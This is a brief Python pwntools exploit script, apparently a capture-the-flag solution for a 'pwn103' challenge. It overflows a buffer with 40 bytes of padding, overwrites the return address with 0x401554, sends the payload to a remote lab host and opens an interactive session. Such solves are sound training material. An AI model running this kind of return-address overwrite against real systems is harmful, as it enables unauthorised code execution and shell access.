#!/usr/bin/env python3

from pwn import *
context.binary = binary = ELF("./pwn103")
context.log_level = "critical"

payload = flat([
b'A'*40,
p64(0x0000000000401554)
])

p = remote("10.10.113.183", 9003)

p.sendline('3')
p.sendline(payload)

p.interactive()
